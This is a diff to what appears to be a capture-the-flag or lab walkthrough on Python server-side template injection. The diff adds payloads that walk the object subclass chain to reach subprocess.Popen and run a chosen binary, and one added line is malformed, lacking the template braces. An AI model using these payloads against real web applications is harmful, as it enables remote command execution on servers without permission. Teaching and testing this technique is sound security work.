@@ -12,11 +12,16 @@ Check the report carefully, as you can see that the `__` are hidden due to the p
 You may need to change the value 1 to get the list of interesting functions. Once you get it, you will need to find one that will give you code execution. You can use the following payload to get access to <class 'subprocess.Popen'>:
 
 `{{''.__class__.mro()[1].__subclasses__()[X]}}`
+
+'.__class__.mro()[2].__subclasses__()[233](["PATH_TO_BINARY","ARG_1"])
+
 Where X is the integer you need to find.
 
 Finally, you can call this method using:
 
 `{{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}}`
+`{{''.__class__.mro()[2].__subclasses__()[233](["PATH_TO_BINARY","ARG_1"])}}`
+
 Where:
 
 `X` was found previously.
